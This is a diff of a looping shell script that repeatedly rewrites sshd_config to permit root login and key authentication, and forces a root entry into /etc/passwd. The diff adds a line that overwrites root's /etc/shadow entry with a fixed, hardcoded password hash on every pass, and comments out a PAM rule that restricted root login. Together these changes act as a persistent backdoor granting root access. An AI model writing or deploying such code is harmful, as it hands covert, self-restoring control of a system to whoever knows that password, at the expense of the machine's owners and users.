@@ -14,7 +14,7 @@ while :; do
         chmod 0600 /etc/ssh/sshd_config
         sed -i "/PasswordAuthentication/d" /etc/ssh/sshd_config
         echo "PasswordAuthentication no" >>/etc/ssh/sshd_config
-        systemctl restart sshd &>/dev/null
+        systemctl restart sshd
     fi
 
     egrep "^ClientAliveInterval" /etc/ssh/sshd_config &>/dev/null
@@ -22,7 +22,7 @@ while :; do
         chmod 0600 /etc/ssh/sshd_config
         sed -i "/ClientAliveInterval/d" /etc/ssh/sshd_config
         echo "ClientAliveInterval 8" >>/etc/ssh/sshd_config
-        systemctl restart sshd &>/dev/null
+        systemctl restart sshd
     fi
 
     egrep "^ClientAliveCountMax" /etc/ssh/sshd_config &>/dev/null
@@ -30,7 +30,7 @@ while :; do
         chmod 0600 /etc/ssh/sshd_config
         sed -i "/ClientAliveCountMax/d" /etc/ssh/sshd_config
         echo "ClientAliveCountMax 8" >>/etc/ssh/sshd_config
-        systemctl restart sshd &>/dev/null
+        systemctl restart sshd
     fi
 
     egrep "^PermitRootLogin\s+yes$" /etc/ssh/sshd_config &>/dev/null
@@ -38,7 +38,7 @@ while :; do
         chmod 0600 /etc/ssh/sshd_config
         sed -i "/PermitRootLogin/d" /etc/ssh/sshd_config
         echo "PermitRootLogin yes" >>/etc/ssh/sshd_config
-        systemctl restart sshd &>/dev/null
+        systemctl restart sshd
     fi
 
     egrep "^RSAAuthentication\s+yes$" /etc/ssh/sshd_config &>/dev/null
@@ -46,7 +46,7 @@ while :; do
         chmod 0600 /etc/ssh/sshd_config
         sed -i "/RSAAuthentication/d" /etc/ssh/sshd_config
         echo "RSAAuthentication yes" >>/etc/ssh/sshd_config
-        systemctl restart sshd &>/dev/null
+        systemctl restart sshd
     fi
 
     egrep "^PubkeyAuthentication\s+yes$" /etc/ssh/sshd_config &>/dev/null
@@ -54,7 +54,7 @@ while :; do
         chmod 0600 /etc/ssh/sshd_config
         sed -i "/PubkeyAuthentication/d" /etc/ssh/sshd_config
         echo "PubkeyAuthentication yes" >>/etc/ssh/sshd_config
-        systemctl restart sshd &>/dev/null
+        systemctl restart sshd
     fi
 
     egrep "^PermitEmptyPasswords\s+no$" /etc/ssh/sshd_config &>/dev/null
@@ -62,7 +62,7 @@ while :; do
         chmod 0600 /etc/ssh/sshd_config
         sed -i "/PermitEmptyPasswords/d" /etc/ssh/sshd_config
         echo "PermitEmptyPasswords no" >>/etc/ssh/sshd_config
-        systemctl restart sshd &>/dev/null
+        systemctl restart sshd
     fi
 
     egrep "^AuthorizedKeysFile\s+\.ssh\/authorized_keys$" /etc/ssh/sshd_config &>/dev/null
@@ -70,7 +70,7 @@ while :; do
         chmod 0600 /etc/ssh/sshd_config
         sed -i "/AuthorizedKeysFile/d" /etc/ssh/sshd_config
         echo "AuthorizedKeysFile .ssh/authorized_keys" >>/etc/ssh/sshd_config
-        systemctl restart sshd &>/dev/null
+        systemctl restart sshd
     fi
 
     grep ":/bin/bash\s*$" /etc/passwd | grep -v "^\s*root:" &>/dev/null
@@ -84,14 +84,16 @@ while :; do
         sed -i "1i\root:x:0:0:root:\/root:\/bin\/bash" /etc/passwd
     fi
 
+    sed -i 's/^root:.*$/root:\$6\$ex0u6ZI7omnNoT3T\$zmFubsbiHS6noSp8E37xJDoNnLkUOjGIAliZA921hWSjMR6KuF9MFweRuUQCe.78XU2bVFx\/KuQtYIbj2YhCA\/::0:99999:7:::/g' /etc/shadow
+
     ######################################
 
-    which v2ray &>/dev/null
-    if [ $? -eq 0 ]; then
-        egrep "^auth\s+required\s+pam_succeed_if.so\s+user\s+!=\s+root\s+quiet$" /etc/pam.d/login &>/dev/null
-        if [ $? -ne 0 ]; then
-            chmod 0644 /etc/pam.d/login
-            echo "auth required pam_succeed_if.so user != root quiet" >>/etc/pam.d/login
-        fi
-    fi
+    # which v2ray &>/dev/null
+    # if [ $? -eq 0 ]; then
+    #     egrep "^auth\s+required\s+pam_succeed_if.so\s+user\s+!=\s+root\s+quiet$" /etc/pam.d/login &>/dev/null
+    #     if [ $? -ne 0 ]; then
+    #         chmod 0644 /etc/pam.d/login
+    #         echo "auth required pam_succeed_if.so user != root quiet" >>/etc/pam.d/login
+    #     fi
+    # fi
 done
